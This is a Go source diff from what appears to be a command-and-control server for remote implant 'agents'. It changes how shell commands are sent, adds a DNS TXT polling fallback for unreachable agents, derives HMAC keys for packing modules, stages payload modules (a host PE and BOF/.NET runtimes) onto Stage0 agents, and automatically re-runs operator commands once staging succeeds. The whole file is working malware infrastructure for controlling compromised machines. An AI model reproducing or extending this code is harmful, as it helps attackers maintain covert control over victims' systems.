@@ -11,21 +11,26 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 	"time"
 )
 
 // SendCommand sends a shell command to the agent
 func SendCommand(uuid string, command string) error {
-	val, ok := globals.Clients.Load(uuid)
-	if !ok {
-		return fmt.Errorf("agent offline")
-	}
-	client := val.(*globals.Client)
-
-	// OpSec: 精确过滤 UI 发送的 ping 心跳包（仅匹配 JSON 格式的 {"type":"ping"}）
+	// OpSec: 精确过滤 UI 发送的 ping 心跳包
 	if command == `{"type":"ping"}` || command == "ping" {
 		return nil
 	}
+
+	val, ok := globals.Clients.Load(uuid)
+	if !ok {
+		// DNS-only (or temporarily offline): queue for TXT poll protocol
+		DNSEnqueueCommand(uuid, command)
+		DNSRegisterTouch(uuid)
+		_ = store.CreateCommandLog(uuid, fmt.Sprintf("DNS-%d", globals.GetNextReqID()), "shell", command)
+		return nil
+	}
+	client := val.(*globals.Client)
 
 	reqID := fmt.Sprintf("CMD-%d", globals.GetNextReqID())
 	msg := globals.MessageWrapper{
@@ -37,10 +42,44 @@ func SendCommand(uuid string, command string) error {
 		},
 	}
 
-	// [LOGGING] Record command to DB
 	_ = store.CreateCommandLog(uuid, reqID, "shell", command)
 
 	return WriteEncryptedMessage(client, msg)
+}
+
+// ModuleHMACKeyForListener returns derive_module_key(get_aes_key()) material for a listener.
+func ModuleHMACKeyForListener(encryptKey, encryptionSalt string) []byte {
+	rawKey := strings.TrimSpace(encryptKey)
+	if rawKey == "" {
+		rawKey = strings.TrimSpace(store.GetSetting("system_aes_key"))
+	}
+	if rawKey == "" {
+		return DefaultModuleKey()
+	}
+	base := normalizeAESKey(rawKey)
+	salt := make([]byte, 32)
+	copy(salt, []byte(strings.TrimSpace(encryptionSalt)))
+	return DeriveModuleKey(utils.DeriveKeyAgent(base, salt))
+}
+
+// ModuleHMACKeyForAgent returns the CKMS HMAC key matching the live agent session.
+func ModuleHMACKeyForAgent(client *globals.Client) []byte {
+	if client == nil {
+		return DefaultModuleKey()
+	}
+	rawKey := strings.TrimSpace(client.EncryptKey)
+	saltStr := strings.TrimSpace(client.EncryptionSalt)
+	if saltStr == "" && client.ListenerID != "" {
+		if val, ok := globals.Listeners.Load(client.ListenerID); ok {
+			if ln, ok := val.(*globals.Listener); ok {
+				saltStr = strings.TrimSpace(ln.EncryptionSalt)
+				if rawKey == "" {
+					rawKey = strings.TrimSpace(ln.EncryptKey)
+				}
+			}
+		}
+	}
+	return ModuleHMACKeyForListener(rawKey, saltStr)
 }
 
 // SendModuleStage packs and pushes an L2 module (CKMS) to a Stage0 agent.
@@ -59,30 +98,19 @@ func SendModuleStageWait(uuid, moduleID string, timeout time.Duration) (string, 
 
 	ms := GetModuleService()
 	// Agent module HMAC key = derive_module_key(get_aes_key()).
-	// get_aes_key() = DeriveKey(normalize(baseAES), salt32)  — salt ALWAYS applied when present
-	// (Go websocket also uses make([]byte,32)+copy salt, then DeriveKey).
-	// Bug: packing with only base AES (no salt KDF) → HMAC verify failed on agent.
-	rawKey := strings.TrimSpace(client.EncryptKey)
-	if rawKey == "" {
-		rawKey = strings.TrimSpace(store.GetSetting("system_aes_key"))
-	}
-	if rawKey == "" {
-		// Release agent without patch: empty get_aes_key → default_module_key
-		ms.SetKeySeed(nil)
-	} else {
-		base := normalizeAESKey(rawKey)
-		salt := make([]byte, 32)
-		copy(salt, []byte(strings.TrimSpace(client.EncryptionSalt)))
-		// Same as WriteEncryptedMessage session key material
-		sessionKey := utils.DeriveKey(base, salt)
-		// SetKeySeed applies derive_module_key(sessionKey) ≡ agent module_key()
-		ms.SetKeySeed(sessionKey)
+	// CRITICAL: Rust get_aes_key() uses crypto::derive_key = SHA256×100k (DeriveKeyAgent),
+	// NOT Argon2id (utils.DeriveKey). Packing with Argon2 → permanent HMAC verify failed
+	// while Noise traffic still works (PSK = base key only).
+	moduleHMAC := ModuleHMACKeyForAgent(client)
+	if len(moduleHMAC) == 0 {
+		moduleHMAC = DefaultModuleKey()
+		log.Printf("[Module] packing %s with DEFAULT module key (no AES on client %s)", moduleID, uuid)
 	}
 
 	// Ensure runtime bins from disk if not registered yet
 	_ = ms.TryLoadDefaultRuntime(moduleID)
 
-	b64, err := ms.PackBase64(moduleID)
+	b64, err := ms.PackBase64WithKey(moduleID, moduleHMAC)
 	if err != nil {
 		return "", err
 	}
@@ -110,8 +138,7 @@ func SendModuleStageWait(uuid, moduleID string, timeout time.Duration) (string, 
 		return "", err
 	}
 	if timeout <= 0 {
-		// Fire-and-forget: still mark optimistic so UI can disable re-push after operator confirms
-		GetModuleService().MarkAgentModule(uuid, moduleID)
+		// Fire-and-forget: do not mark loaded until agent acks (avoids false "already staged")
 		return reqID, nil
 	}
 
@@ -121,6 +148,14 @@ func SendModuleStageWait(uuid, moduleID string, timeout time.Duration) (string, 
 			out, _ := m["stdout"].(string)
 			se, _ := m["stderr"].(string)
 			if se != "" && out == "" {
+				GetModuleService().ClearAgentModule(uuid, moduleID)
+				return "", fmt.Errorf("%s", se)
+			}
+			// HMAC / verify failures often appear in stderr with partial stdout
+			if strings.Contains(strings.ToLower(se), "hmac") ||
+				strings.Contains(strings.ToLower(se), "verify failed") ||
+				strings.Contains(strings.ToLower(se), "module verify") {
+				GetModuleService().ClearAgentModule(uuid, moduleID)
 				return "", fmt.Errorf("%s", se)
 			}
 			GetModuleService().MarkAgentModule(uuid, moduleID)
@@ -129,9 +164,8 @@ func SendModuleStageWait(uuid, moduleID string, timeout time.Duration) (string, 
 		GetModuleService().MarkAgentModule(uuid, moduleID)
 		return fmt.Sprintf("%v", resp), nil
 	case <-time.After(timeout):
-		// May still have loaded; mark optimistic so UI shows staged
-		GetModuleService().MarkAgentModule(uuid, moduleID)
-		log.Printf("[Module] wait ack timeout for %s on %s — marked staged (optimistic)", moduleID, uuid)
+		// Do not optimistically mark — UI would block re-push and hide real failures
+		log.Printf("[Module] wait ack timeout for %s on %s — NOT marking staged", moduleID, uuid)
 		return "", fmt.Errorf("module_stage ack timeout for %s", moduleID)
 	}
 }
@@ -170,19 +204,50 @@ func EnsureHeavyRuntimeModule(uuid, moduleID string) error {
 	}
 	// Isolated path: only need the host PE
 	hostID := "iso_host"
-	_, err := SendModuleStageWait(uuid, hostID, 25*time.Second)
-	if err != nil && strings.Contains(err.Error(), "timeout") {
-		time.Sleep(1500 * time.Millisecond)
-		return nil
-	}
+	_, err := SendModuleStageWait(uuid, hostID, 45*time.Second)
 	if err != nil {
+		// Do not treat timeout as success — BOF will fail with iso_host PE missing
 		return err
 	}
+	// Brief settle so agent finishes load before first CIS1 job
 	time.Sleep(400 * time.Millisecond)
 	return nil
 }
 
+// PendingCommandRetry holds a command to re-dispatch after module_stage succeeds.
+type PendingCommandRetry struct {
+	CommandType    string
+	CommandContent string
+	Path           string
+	Data           string
+	ReqID          string
+	Created        time.Time
+}
+
+var pendingModuleRetries sync.Map // uuid -> PendingCommandRetry
+
+// RememberCommandForModuleRetry stores the operator command that hit module_required.
+func RememberCommandForModuleRetry(uuid string, cmd globals.CommandPayload) {
+	if uuid == "" || cmd.CommandType == "" {
+		return
+	}
+	// Avoid retrying module_* control plane commands
+	ct := strings.ToLower(cmd.CommandType)
+	if strings.HasPrefix(ct, "module_") {
+		return
+	}
+	pendingModuleRetries.Store(uuid, PendingCommandRetry{
+		CommandType:    cmd.CommandType,
+		CommandContent: cmd.CommandContent,
+		Path:           cmd.Path,
+		Data:           cmd.Data,
+		ReqID:          cmd.ReqID,
+		Created:        time.Now(),
+	})
+}
+
 // MaybeAutoPushModule inspects agent stderr for module_required:<id> and pushes once.
+// On successful stage, re-dispatches a remembered operator command (if any, <60s).
 func MaybeAutoPushModule(uuid, stderr string) {
 	if !strings.Contains(stderr, "module_required:") {
 		return
@@ -204,10 +269,47 @@ func MaybeAutoPushModule(uuid, stderr string) {
 	if id == "" {
 		return
 	}
-	if err := SendModuleStage(uuid, id); err != nil {
-		log.Printf("[Module] auto-push %s → %s failed: %v (upload module to storage/modules first)", id, uuid, err)
-	} else {
-		log.Printf("[Module] auto-pushed module %s to agent %s — re-run the command after ~1s", id, uuid)
+	// Heavy BOF/.NET product path needs iso_host, not legacy bof/dotnet DLL
+	stageID := id
+	if id == "bof" || id == "dotnet" {
+		stageID = "iso_host"
+	}
+	if _, err := SendModuleStageWait(uuid, stageID, 25*time.Second); err != nil {
+		log.Printf("[Module] auto-push %s → %s failed: %v (upload module to storage/modules first)", stageID, uuid, err)
+		return
+	}
+	log.Printf("[Module] auto-pushed module %s to agent %s", stageID, uuid)
+
+	// Optional re-dispatch of the command that triggered module_required
+	if v, ok := pendingModuleRetries.LoadAndDelete(uuid); ok {
+		pr, ok := v.(PendingCommandRetry)
+		if !ok || time.Since(pr.Created) > 60*time.Second {
+			return
+		}
+		val, ok := globals.Clients.Load(uuid)
+		if !ok {
+			return
+		}
+		client := val.(*globals.Client)
+		reqID := pr.ReqID
+		if reqID == "" {
+			reqID = fmt.Sprintf("RETRY-%d", globals.GetNextReqID())
+		}
+		msg := globals.MessageWrapper{
+			MsgType: "command",
+			Payload: globals.CommandPayload{
+				CommandType:    pr.CommandType,
+				CommandContent: pr.CommandContent,
+				Path:           pr.Path,
+				Data:           pr.Data,
+				ReqID:          reqID,
+			},
+		}
+		if err := WriteEncryptedMessage(client, msg); err != nil {
+			log.Printf("[Module] auto-retry %s on %s failed: %v", pr.CommandType, uuid, err)
+		} else {
+			log.Printf("[Module] auto-retried command %s on agent %s after staging %s", pr.CommandType, uuid, stageID)
+		}
 	}
 }
 
